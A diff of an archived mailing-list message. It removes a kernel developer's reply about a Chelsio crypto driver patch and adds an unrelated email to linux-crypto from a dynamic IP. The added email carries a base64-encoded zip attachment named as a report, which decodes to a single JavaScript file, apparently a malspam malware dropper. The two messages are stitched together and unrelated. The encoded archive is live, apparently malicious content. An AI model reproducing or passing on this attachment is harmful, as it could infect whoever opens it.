@@ -1,115 +1,107 @@
-From: Harsh Jain <harshjain.prof-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Subject: Re: [PATCH 08/22] crypto: chcr: Make use of the new sg_map helper
- function
-Date: Sat, 15 Apr 2017 10:23:33 +0530
-Message-ID: <CAFXBA=k74+9jRZQX4r_iGoL8yiDbXPDTLw+AELEb1LeT_jeKiQ@mail.gmail.com>
-References: <1492121135-4437-1-git-send-email-logang@deltatee.com>
- <1492121135-4437-9-git-send-email-logang@deltatee.com>
+From: <smallgroups@dudleycvs.org.uk>
+Subject: (unknown)
+Date: Sat, 15 Apr 2017 13:53:09 -0000
+Message-ID: <149226438945.21744.4048955814039986594@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Cc: Steve Wise <swise-7bPotxP6k4+P2YhJcF5u+vpXobYPEAuW@public.gmane.org>, linux-nvme-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org,
- target-devel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Sumit Semwal <sumit.semwal-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>,
- devel-gWbeCf7V1WCQmaza687I9mD2FQJk+8+b@public.gmane.org, rds-devel-N0ozoZBvEnrZJqsBc5GL+g@public.gmane.org,
- linux-scsi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Matthew Wilcox <mawilcox-0li6OtcxBFHby3iVrkZq2A@public.gmane.org>,
- linux-rdma-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Christoph Hellwig <hch-jcswGhMUV9g@public.gmane.org>,
- fcoe-devel-s9riP+hp16TNLxjTenLetw@public.gmane.org, open-iscsi-/JYPxA39Uh5TLH3MbocFFw@public.gmane.org,
- linux-media-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Ming Lin <ming.l-Vzezgt5dB6uUEJcrhfAQsw@public.gmane.org>,
- intel-gfx-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org, sparmaintainer-GLv8BlqOqDDQT0dZR+AlfA@public.gmane.org,
- linux-raid-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, dri-devel-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org,
- megaraidlinux.pdl-dY08KVG/lbpWk0Htik3J/w@public.gmane.org, Jens Axboe <axboe-tSWWG44O7X1aa/9Udqfwiw@public.gmane.org>,
- linaro-mm-sig-cunTk1MwBs8s++Sfvej+rw@public.gmane.org,
- "Martin K. Petersen" <martin.petersen-QHcLZuEGTsvQT0dZR+AlfA@public.gmane.org>,
- Greg Kroah-Hartman <gregkh-hQyY1W1yCW8ekmWlsbkhG0B+6BGkLq7r@public.gmane.org>, linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org,
- linux-mmc-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
- linux-crypto-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, netdev@
-To: Logan Gunthorpe <logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org>, harsh-ut6Up61K2wZBDgjK7y7TUQ@public.gmane.org
-Return-path: <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-In-Reply-To: <1492121135-4437-9-git-send-email-logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org>
-List-Unsubscribe: <https://lists.01.org/mailman/options/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.01.org/pipermail/linux-nvdimm/>
-List-Post: <mailto:linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Help: <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.01.org/mailman/listinfo/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=subscribe>
-Errors-To: linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org
-Sender: "Linux-nvdimm" <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Id: linux-crypto.vger.kernel.org
+Content-Type: application/zip; name="REPORT_8394710_linux-crypto.zip"
+Content-Transfer-Encoding: base64
+To: "linux-crypto" <linux-crypto@vger.kernel.org>
+Return-path: <linux-crypto-owner@vger.kernel.org>
+Received: from 114-42-235-119.dynamic-ip.hinet.net ([114.42.235.119]:34628
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751541AbdDONxQ (ORCPT
+        <rfc822;linux-crypto@vger.kernel.org>);
+        Sat, 15 Apr 2017 09:53:16 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-crypto-owner@vger.kernel.org
+List-ID: <linux-crypto.vger.kernel.org>
 
-On Fri, Apr 14, 2017 at 3:35 AM, Logan Gunthorpe <logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org> wrote:
-> The get_page in this area looks *highly* suspect due to there being no
-> corresponding put_page. However, I've left that as is to avoid breaking
-> things.
-chcr driver will post the request to LLD driver cxgb4 and put_page is
-implemented there. it will no harm. Any how
-we have removed the below code from driver.
-
-http://www.mail-archive.com/linux-crypto-u79uwXL29TY76Z2rM5mHXA@public.gmane.org/msg24561.html
-
-After this merge we can ignore your patch. Thanks
-
->
-> I've also removed the KMAP_ATOMIC_ARGS check as it appears to be dead
-> code that dates back to when it was first committed...
-
-
->
-> Signed-off-by: Logan Gunthorpe <logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org>
-> ---
->  drivers/crypto/chelsio/chcr_algo.c | 28 +++++++++++++++-------------
->  1 file changed, 15 insertions(+), 13 deletions(-)
->
-> diff --git a/drivers/crypto/chelsio/chcr_algo.c b/drivers/crypto/chelsio/chcr_algo.c
-> index 41bc7f4..a993d1d 100644
-> --- a/drivers/crypto/chelsio/chcr_algo.c
-> +++ b/drivers/crypto/chelsio/chcr_algo.c
-> @@ -1489,22 +1489,21 @@ static struct sk_buff *create_authenc_wr(struct aead_request *req,
->         return ERR_PTR(-EINVAL);
->  }
->
-> -static void aes_gcm_empty_pld_pad(struct scatterlist *sg,
-> -                                 unsigned short offset)
-> +static int aes_gcm_empty_pld_pad(struct scatterlist *sg,
-> +                                unsigned short offset)
->  {
-> -       struct page *spage;
->         unsigned char *addr;
->
-> -       spage = sg_page(sg);
-> -       get_page(spage); /* so that it is not freed by NIC */
-> -#ifdef KMAP_ATOMIC_ARGS
-> -       addr = kmap_atomic(spage, KM_SOFTIRQ0);
-> -#else
-> -       addr = kmap_atomic(spage);
-> -#endif
-> -       memset(addr + sg->offset, 0, offset + 1);
-> +       get_page(sg_page(sg)); /* so that it is not freed by NIC */
-> +
-> +       addr = sg_map(sg, SG_KMAP_ATOMIC);
-> +       if (IS_ERR(addr))
-> +               return PTR_ERR(addr);
-> +
-> +       memset(addr, 0, offset + 1);
-> +       sg_unmap(sg, addr, SG_KMAP_ATOMIC);
->
-> -       kunmap_atomic(addr);
-> +       return 0;
->  }
->
->  static int set_msg_len(u8 *block, unsigned int msglen, int csize)
-> @@ -1940,7 +1939,10 @@ static struct sk_buff *create_gcm_wr(struct aead_request *req,
->         if (req->cryptlen) {
->                 write_sg_to_skb(skb, &frags, src, req->cryptlen);
->         } else {
-> -               aes_gcm_empty_pld_pad(req->dst, authsize - 1);
-> +               err = aes_gcm_empty_pld_pad(req->dst, authsize - 1);
-> +               if (err)
-> +                       goto dstmap_fail;
-> +
->                 write_sg_to_skb(skb, &frags, reqctx->dst, crypt_len);
->
->         }
-> --
-> 2.1.4
->
+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
